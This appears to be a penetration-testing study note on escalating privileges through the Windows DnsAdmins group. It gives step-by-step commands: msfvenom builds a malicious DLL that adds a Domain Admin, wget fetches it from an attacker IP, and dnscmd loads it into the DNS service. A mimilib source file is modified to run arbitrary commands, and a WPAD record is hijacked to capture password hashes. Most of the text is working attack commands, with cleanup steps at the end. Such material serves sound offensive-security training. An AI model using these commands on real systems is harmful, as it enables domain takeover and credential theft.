# Windows DnsAdmins Attacks

* Members of the DnsAdmins group have access to DNS information on the network
* The Windows DNS service supports custom plugins and can call functions from them to resolve name queries that are not in the scope of any locally hosted DNS zones
  * The DNS service runs as `NT AUTHORITY\SYSTEM`, so membership in this group could potentially be leveraged to escalate privileges on a Domain Controller or in a situation where a separate server is acting as the DNS server for the domain
  * It is possible to use the built-in [dnscmd](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/dnscmd) utility to specify the path of the plugin DLL.
* when DNS is run on a Domain Controller (which is very common):
  * DNS management is performed over RPC
  * [ServerLevelPluginDll](https://docs.microsoft.com/en-us/openspecs/windows\_protocols/ms-dnsp/c9d38538-8827-44e6-aa5e-022a016ed723) allows us to load a custom DLL with zero verification of the DLL's path. This can be done with the `dnscmd` tool from the command line
  * When a member of the `DnsAdmins` group runs the `dnscmd` command below, the `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\DNS\Parameters\ServerLevelPluginDll` registry key is populated
  * When the DNS service is restarted, the DLL in this path will be loaded (i.e., a network share that the Domain Controller's machine account can access)
  * An attacker can load a custom DLL to obtain a reverse shell or even load a tool such as Mimikatz as a DLL to dump credentials.

### Leveraging DnsAdmins Access

#### Generating Malicious DLL

```shell-session
msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll
```

#### Starting Local HTTP Server

* \[\[Transferring Files]]

#### Downloading File to Target

```powershell-session
wget "http://10.10.14.3:7777/adduser.dll" -outfile "adduser.dll"
```

#### Loading DLL as Non-Privileged User

```cmd-session
dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll
```

* **Only members of the `DnsAdmins` group are permitted to do this.**
* if failed do next step

**Loading DLL as Member of DnsAdmins**

```powershell-session
Get-ADGroupMember -Identity DnsAdmins
```

**Loading Custom DLL**

```cmd-session
dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll
```

* **Note: We must specify the full path to our custom DLL or the attack will not work properly.**
* Only the `dnscmd` utility can be used by members of the `DnsAdmins` group, as they do not directly have permission on the registry key.
* &#x20;the DLL will be loaded the next time the DNS service is started
* Membership in the DnsAdmins group doesn't give the ability to restart the DNS service,
  * but this is something that sysadmins might permit DNS admins to do.
* After restarting the DNS service (if our user has this level of access), we should be able to run our custom DLL and add a user (in our case) or get a reverse shell.
* If we do not have access to restart the DNS server, we will have to wait until the server or service restarts.

#### Check our current user's permissions on the DNS service.

**Finding User's SID**

```cmd-session
wmic useraccount where name="netadm" get sid
```

**Checking Permissions on DNS Service**

* Once we have the user's SID, we can use the `sc` command to check permissions on the service

```cmd-session
sc.exe sdshow DNS
```

* &#x20;Per this [article](https://www.winhelponline.com/blog/view-edit-service-permissions-windows/),
  * we can check if our user has `RPWP` permissions which translate to `SERVICE_START` and `SERVICE_STOP`, respectively.

#### Stopping the DNS Service

```cmd-session
sc stop dns
```

* The DNS service will attempt to start and run our custom DLL, but if we check the status, it will show that it failed to start correctly

#### Starting the DNS Service

```cmd-session
sc start dns
```

#### Confirming Group Membership

```cmd-session
 net group "Domain Admins" /dom
```

* **for you to get domain admin permissions you need to log out and login**

### Cleaning Up

* Making configuration changes and stopping/restarting the DNS service on a Domain Controller are very destructive actions and must be exercised with great care.

#### Confirming Registry Key Added

* The first step is confirming that the `ServerLevelPluginDll` registry key exists.
  * Until our custom DLL is removed, we will not be able to start the DNS service again correctly.

```cmd-session
 reg query \\10.129.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters
```

#### Deleting Registry Key

```cmd-session
reg delete \\10.129.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters  /v ServerLevelPluginDll
```

#### Starting the DNS Service Again

```cmd-session
sc.exe start dns
```

#### Checking DNS Service Status

```cmd-session
sc query dns
```

### Using Mimilib.dll

* we could also utilize [mimilib.dll](https://github.com/gentilkiwi/mimikatz/tree/master/mimilib)
  * from the creator of the `Mimikatz` tool to gain command execution by modifying the [kdns.c](https://github.com/gentilkiwi/mimikatz/blob/master/mimilib/kdns.c) file to execute a reverse shell one-liner or another command of our choosing.

```c
/*	Benjamin DELPY `gentilkiwi`
	https://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
#include "kdns.h"

DWORD WINAPI kdns_DnsPluginInitialize(PLUGIN_ALLOCATOR_FUNCTION pDnsAllocateFunction, PLUGIN_FREE_FUNCTION pDnsFreeFunction)
{
	return ERROR_SUCCESS;
}

DWORD WINAPI kdns_DnsPluginCleanup()
{
	return ERROR_SUCCESS;
}

DWORD WINAPI kdns_DnsPluginQuery(PSTR pszQueryName, WORD wQueryType, PSTR pszRecordOwnerName, PDB_RECORD *ppDnsRecordListHead)
{
	FILE * kdns_logfile;
#pragma warning(push)
#pragma warning(disable:4996)
	if(kdns_logfile = _wfopen(L"kiwidns.log", L"a"))
#pragma warning(pop)
	{
		klog(kdns_logfile, L"%S (%hu)\n", pszQueryName, wQueryType);
		fclose(kdns_logfile);
	    system("ENTER COMMAND HERE");
	}
	return ERROR_SUCCESS;
}
```

#### Reference

* https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html

### Creating a WPAD Recorder

* Another way to abuse DnsAdmins group privileges is by creating a WPAD record
* Membership in this group gives us the rights to [disable global query block security](https://docs.microsoft.com/en-us/powershell/module/dnsserver/set-dnsserverglobalqueryblocklist?view=windowsserver2019-ps), which by default blocks this attack
* Server 2008 first introduced the ability to add to a global query block list on a DNS server.
* By default,
  * **Web Proxy Automatic Discovery Protocol (WPAD)** and **Intra-site Automatic Tunnel Addressing Protocol (ISATAP)** are on the global query block list.
    * These protocols are quite vulnerable to hijacking, and any domain user can create a computer object or DNS record containing those names.
* After disabling the global query block list and creating a WPAD record, every machine running WPAD with default settings will have its traffic proxied through our attack machine
* We could use a tool such as [Responder](https://github.com/lgandx/Responder) or [Inveigh](https://github.com/Kevin-Robertson/Inveigh) to perform traffic spoofing, and attempt to capture password hashes and crack them offline or perform an SMBRelay attack.

#### Disabling the Global Query Block List

```powershell-session
Set-DnsServerGlobalQueryBlockList -Enable $false -ComputerName dc01.inlanefreight.local
```

#### Adding a WPAD Record

```powershell-session
Add-DnsServerResourceRecordA -Name wpad -ZoneName inlanefreight.local -ComputerName dc01.inlanefreight.local -IPv4Address 10.10.14.3
```

## Reference

* https://www.winhelponline.com/blog/view-edit-service-permissions-windows/
* https://adsecurity.org/?p=4064
* https://academy.hackthebox.com/module/67/section/603
